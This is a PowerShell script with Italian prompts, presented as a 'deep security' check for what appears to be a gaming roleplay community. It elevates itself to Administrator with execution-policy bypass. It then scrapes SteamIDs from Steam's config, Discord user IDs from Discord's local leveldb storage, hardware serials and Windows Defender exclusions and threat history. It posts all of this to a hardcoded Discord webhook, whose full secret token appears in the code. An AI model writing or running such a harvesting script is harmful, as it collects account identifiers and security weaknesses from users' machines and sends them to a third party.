if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
Clear-Host
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   NOW RP V3 - ULTIMATE DEEP SECURITY   " -ForegroundColor Yellow
Write-Host "========================================`n" -ForegroundColor Cyan

$n = Read-Host "Inserisci il tuo Nickname Discord"
$h = "https://discord.com/api/webhooks/1563653917932396556/9wpu5_KBJcDg9kQJ6IxfijGrnfKwfkBPghuySZHxDcMSv9PVuP4NG3cEFLXCTY7sSiQz"

# --- 1. DATI SISTEMA & HARDWARE ---
$s = Get-CimInstance Win32_OperatingSystem
$o = $s.InstallDate.ToString('dd/MM/yyyy HH:mm')
$sr = $s.SerialNumber
$pc = (Get-CimInstance Win32_ComputerSystem).Model
$gpu = (Get-CimInstance Win32_VideoController).Name -join ", "

# --- 2. STEAM & DISCORD ---
Invoke-Expression '$v = "C:\Program Files (x86)\Steam\config\loginusers.vdf"'
$st = "Non trovato"
if(Test-Path $v){ $id = (Get-Content $v -EA 0 | Select-String '"7656119' -EA 0 | ForEach-Object { $_.ToString().Split('"')[1] }); if($id){ $st = $id -join ", " } }

$dc = (Get-ChildItem "$env:APPDATA" -Filter "*discord*" -EA 0).Count
$tk = Get-ChildItem "$env:APPDATA\discord\Local Storage\leveldb" -EA 0 | Select-String -Pattern '"id":"(\d{17,19})"' -EA 0 | ForEach-Object { $_.Matches.Groups[1].Value } | Select-Object -Unique
$di = if($tk){ $tk -join ", " } else { "Nessuno" }

# --- 3. CONFIGURAZIONE & DIFESA WINDOWS DEFENDER ---
$def = Get-MpComputerStatus -EA 0
$rt = if($def.RealTimeProtectionEnabled){ "Attiva" } else { "Disattivata ⚠️" }
$cloud = if($def.CloudBlockLevel){ "Attivo" } else { "Disattivato" }

# Esclusioni dettagliate (Path, Estensioni, Processi)
$pref = Get-MpPreference -EA 0
$exPath = if($pref.ExclusionPath){ $pref.ExclusionPath -join "`n• " } else { "Nessuna esclusione di percorso" }
$exExt = if($pref.ExclusionExtension){ $pref.ExclusionExtension -join ", " } else { "Nessuna estensione esclusa" }
$exProc = if($pref.ExclusionProcess){ $pref.ExclusionProcess -join ", "  } else { "Nessun processo escluso" }

# Cronologia Minacce / Quarantena (Con nomi file e dettagli)
$threats = Get-MpThreatDetection -EA 0
$threatList = "Nessuna minaccia nella cronologia recente"
if ($threats) {
    $threatList = ($threats | Select-Object -First 10 | ForEach-Object {
        $tName = $_.InitialDetectionName
        $tPath = $_.Resources -join " | "
        "• **Minaccia:** $tName`n  *Path:* $tPath"
    }) -join "`n"
}

# --- 4. COSTRUZIONE EMBED MULTIPLI (PER BYPASSARE OGNI LIMITE) ---
$embeds = @(
    @{
        title = "🛡️ NOW RP V3 - System & Identity Report"
        description = "Rapporto di sicurezza avanzato per: **$n**"
        color = 3447003
        fields = @(
            @{ name = "💻 Sistema Operativo & Hardware"; value = "• **Installazione OS:** $o`n• **Seriale:** $sr`n• **PC / GPU:** $pc | $gpu"; inline = $false },
            @{ name = "🎮 Identità di Gioco"; value = "• **SteamID64:** $st`n• **Discord ID (Cache):** $di`n• **Istanze Discord:** $dc trovate"; inline = $false }
        )
    },
    @{
        title = "🔍 NOW RP V3 - Antivirus & Defender Audit"
        description = " Stato dei moduli di sicurezza e configurazioni di difesa."
        color = 15158332
        fields = @(
            @{ name = "⚙️ Stato Protezione"; value = "• **Real-Time Protection:** $rt`n• **Cloud Delivery:** $cloud"; inline = $false },
            @{ name = "📂 Esclusioni di Percorso (Path)"; value = "• $exPath"; inline = $false },
            @{ name = "🧩 Estensioni ed Esclusioni Processi"; value = "• **Estensioni:** $exExt`n• **Processi:** $exProc"; inline = $false }
        )
    },
    @{
        title = "🚨 NOW RP V3 - Threat History & Quarantine"
        description = " Storico delle infezioni, file rilevati e oggetti intercettati da Defender."
        color = 10038562
        fields = @(
            @{ name = "📋 Cronologia Minacce Rilevate"; value = "$threatList"; inline = $false }
        )
    }
)

$payload = @{ embeds = $embeds }

# --- 5. INVIO AL WEBHOOK DI DISCORD ---
try { 
    $jsonBody = $payload | ConvertTo-Json -Depth 6
    Invoke-RestMethod -Uri $h -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($jsonBody)) -ContentType 'application/json; charset=utf-8' -EA 0 | Out-Null 
} catch {}

Clear-Host
Write-Host "`n[+] Analisi di sicurezza profonda completata con successo!" -ForegroundColor Green
Write-Host "[+] Tutti i dati di esclusioni, cronologia e difese sono stati inviati su Discord." -ForegroundColor Cyan
Write-Host "[+] Puoi chiudere questa finestra.\n" -ForegroundColor Gray
